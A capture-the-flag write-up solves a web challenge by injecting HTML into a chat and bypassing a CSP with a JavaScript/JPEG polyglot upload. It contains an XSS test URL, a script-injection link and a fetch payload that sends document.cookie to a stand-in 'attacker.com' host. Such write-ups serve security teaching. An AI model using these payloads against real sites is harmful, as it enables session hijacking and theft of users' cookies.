---
source: kevin-mizu
source_url: https://mizu.re/post/kara_jutsus_access
title: "Kara Jutsu Access | mizu.re"
description: "Kara Jutsu Access"
---

_keyboard\_arrow\_up_

title: Kara Jutsu Access

date: Dec 25, 2022

tags: [Writeup](https://mizu.re/tag/Writeup) [YogoshaChristmas\_2022](https://mizu.re/tag/YogoshaChristmas_2022) [Web](https://mizu.re/tag/Web)

# Kara Jutsus Access

![](https://mizu.re/articles/writeups/yogosha_christmas_2022/kara_jutsus_access/images/yogosha.svg)

* * *

Difficulty: 500 points \| 31 solves

Description: Well done accessing some important information! Now I heard that some kara members use the following website for a reason, can you retrieve Dr Amado cookie?

* * *

## Table of content

- [🕵️ Recon](https://mizu.re/post/kara_jutsus_access#%EF%B8%8F-recon)
- [🤡 JFIF polyglote image](https://mizu.re/post/kara_jutsus_access#-jfif-polyglote-image)
- [🎉 Flag](https://mizu.re/post/kara_jutsus_access#-flag)

## 🕵️ Recon

This challenge was the 4th step of the CTF. For this one, we had to find a way to get an XSS to get the bot's cookie. The website was a simple web application with a profile endpoint with a image file upload feature.

![home.png](https://mizu.re/articles/writeups/yogosha_christmas_2022/kara_jutsus_access/images/home.png)

_Home page_

![profile.png](https://mizu.re/articles/writeups/yogosha_christmas_2022/kara_jutsus_access/images/profile.png)

_Profile page_

Trying to find a way to upload a `.svg`, `.html`... files leads to nothing as the file must be a valid PNG / JPEG file. So, we need to find another feature that could be used to get it.

Looking around, it is possible to find a chat that is vulnerable to unsanitized HTML injection:

```url
http://54.82.54.16/index.php?name=a&email=a&subject=a&message=%3Cimg%20src=x%20onerror=alert()%3E&subcom=#
```

Unfortunately, the website is securised using the following CSP which allows only script to be load from the website domain.

```html
<meta http-equiv="Content-Security-Policy" content=" script-src 'self'  ; object-src 'none' ; ">
```

Thus, to bypass this CSP, we have to find a way to upload a valid javascript file.

## 🤡 JFIF polyglote image

To archive the file upload explained above, we need to check 2 conditions:

- Having a valid javascript file content
- Having a valid MIME-Type

Why do we need to have a valid MIME-Type? Because, if we try to load a resource with `<script src="XX">` with an invalid MIME-Type, the browser will block his loading thanks to the [CORB](https://chromium.googlesource.com/chromium/src/+/master/services/network/cross_origin_read_blocking_explainer.md).

What is Cross-Origin Read Blocking (CORB)?

CORB is a Browser security that aims to mitigate side-channel attacks and ensure that protect sensitive resources from been loaded on a website.

To do so, it will restrict the MIME-Type that can be loaded depending on the context. For example, for <script src=""> the MIME-Type must be:

- application/javascript
- application/octet-stream
- ...

More details here: [link](https://chromium.googlesource.com/chromium/src/+/master/services/network/cross_origin_read_blocking_explainer.md).

Luckily for us, files are sent back to the client using the MIME-Type `application/octet-stream`. Thus, if we find a way to upload a valid PNG / Javascript file, we could bypass the CSP.

To do so, we can use this beautiful article: [link](https://systemweakness.com/exploiting-xss-with-javascript-jpeg-polyglot-4cff06f8201a). It explains how to create a Javascript / JPEG Polyglote which is exactly what we are looking for. I won't go deep into details for this part as [@Medusa0xf](https://medium.com/@Medusa0xf) did it well in his article. But, you can use the following small file that I create to reproduce the exploit:

Exploit file: [link](https://mizu.re/articles/writeups/yogosha_christmas_2022/kara_jutsus_access/images/xss.jpeg).

## 🎉 Flag

Changing the javascript payload by the bellow payload and using it as a script source and we can exfiltrate the bot's cookie!

```
fetch("http://attacker.com?cookie=".concat(document.cookie))
```

_Javascript payload_

_Notice the charset="ISO-8859-1" attribute which is necessary to make the exploit works._

```
http://54.82.54.16/index.php?name=a&email=a&subject=a&message=<script charset="ISO-8859-1" src="<IMAGE-PATH>">&subcom=#
```

_Link for the bot_

Flag: `flag=FLAG{K4ra_OnCe_Alw4y5_Kara????}` 🎉

[_keyboard\_arrow\_left_ Kara Jutsu Platform](https://mizu.re/post/kara_jutsus_platform)

[Forbidden Jutsu _keyboard\_arrow\_right_](https://mizu.re/post/forbidden_jutsu)